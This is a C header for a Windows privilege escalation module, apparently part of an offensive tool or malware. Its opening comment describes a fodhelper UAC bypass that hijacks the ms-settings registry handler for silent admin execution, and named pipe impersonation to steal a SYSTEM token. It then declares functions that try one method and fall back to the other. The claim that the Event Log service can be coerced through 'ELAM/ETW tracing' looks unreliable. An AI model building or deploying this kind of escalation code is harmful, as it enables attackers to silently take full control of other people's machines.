/*
 * Privilege escalation module.
 *
 * Two techniques:
 *   Technique 1 — Fodhelper UAC bypass:
 *     Windows 10/11: fodhelper.exe is a Microsoft-signed binary that
 *     auto-elevates without a UAC prompt. It reads the file association
 *     for "ms-settings" from HKCU\Software\Classes and runs the default
 *     handler. By setting HKCU\...\ms-settings\shell\open\command to
 *     our executable, we get silent admin execution.
 *
 *   Technique 2 — Named pipe impersonation (SYSTEM):
 *     Create a named pipe, trick a privileged service into connecting
 *     to it, then use ImpersonateNamedPipeClient to steal its token.
 *     Specifically, we use the "Event Log" service (which runs as SYSTEM
 *     and can be coerced into connecting to a named pipe via the
 *     ELAM/ETW tracing mechanism).
 *
 * Priority: Technique 1 first, then 2 as fallback.
 */

#pragma once
#ifndef ESCALATE_H
#define ESCALATE_H

#include <windows.h>

/* Run as admin via fodhelper UAC bypass. Returns 0 on success. */
int escalate_fodhelper(void);

/* Named pipe impersonation to SYSTEM. Returns 0 on success. */
int escalate_named_pipe(void);

/* Primary entry — tries fodhelper, falls back to pipe. Returns 0 if escalated. */
int escalate_to_system(void);

#endif
